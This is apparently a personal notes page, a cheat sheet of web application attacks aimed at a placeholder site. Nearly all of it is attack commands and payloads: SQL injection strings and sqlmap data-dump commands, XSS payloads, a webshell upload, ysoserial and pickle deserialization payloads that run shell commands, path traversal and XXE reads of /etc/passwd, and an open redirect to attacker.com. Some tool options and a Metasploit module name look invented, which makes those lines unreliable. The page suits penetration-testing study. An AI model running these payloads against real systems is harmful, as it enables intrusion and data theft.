---
layout: notes
permalink: /notes/web/vulns/
title: Web Application Common Vulnerabilities
---

# Web Application Common Vulnerabilities

## SQL Injection
```bash
# Test basic SQLi
curl "http://example.com/login?user=admin' OR 1=1 -- &pass="

# Use sqlmap
sqlmap -u http://example.com/login --data="user=admin&pass=test" --level=3 --risk=3

# Blind SQLi with time-based
sqlmap -u http://example.com/login --technique=T --dbms=mysql

# Extract data
sqlmap -u http://example.com/login --dump

# Union-based
curl "http://example.com/search?q=' UNION SELECT 1,2,3 --"
```

## Cross-Site Scripting (XSS)
```bash
# Reflected XSS test
<script>alert('XSS')</script>

# Stored XSS in form
<input type="text" value="<script>alert('XSS')</script>">

# DOM-based XSS
window.location.href="javascript:alert('XSS')"

# Use XSS Hunter
xsshunter -u http://example.com

# Automate with XSStrike
xsstrike -u http://example.com/search
```

## Cross-Site Request Forgery (CSRF)
```bash
# Test CSRF with curl
curl -X POST http://example.com/action -d "param=value"

# Generate CSRF PoC
csrfgen -u http://example.com -o csrf.html

# Check token absence
curl -I http://example.com/action

# Automate CSRF detection
arachni http://example.com --report=csrf
```

## Remote Code Execution (RCE)
```bash
# Test basic RCE
curl "http://example.com/cmd?input=whoami"

# Use Metasploit for RCE
msfconsole -x "use exploit/multi/http/rce; set RHOSTS example.com; exploit"

# Upload and execute shell
curl -F "file=@shell.php" http://example.com/upload

# Check for deserialization
ysoserial -d CommonsCollections1 -o payload.ser
java -jar ysoserial.jar CommonsCollections1 "touch /tmp/pwned" > payload.ser
```

## Other Vulnerabilities
```bash
# Directory Traversal
curl "http://example.com/download?file=../../etc/passwd"

# File Inclusion
curl "http://example.com?page=php://filter/convert.base64-encode/resource=index.php"

# Insecure Deserialization
python -c 'import pickle; data=pickle.loads(b"cos\\nsystem\\n(S'whoami'\\ntR."); print(data)'

# XML External Entity (XXE)
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>

# Open Redirect
curl "http://example.com/redirect?url=http://attacker.com"
```

## Tools
- sqlmap: ```sqlmap -u http://example.com```
- XSStrike: ```xsstrike -u http://example.com```
- Arachni: ```arachni http://example.com```
- Nikto: ```nikto -h http://example.com```
- OWASP ZAP: ```zap-cli -t http://example.com```
- ysoserial: ```ysoserial -d CommonsCollections1```
- wpscan: ```wpscan --url http://example.com```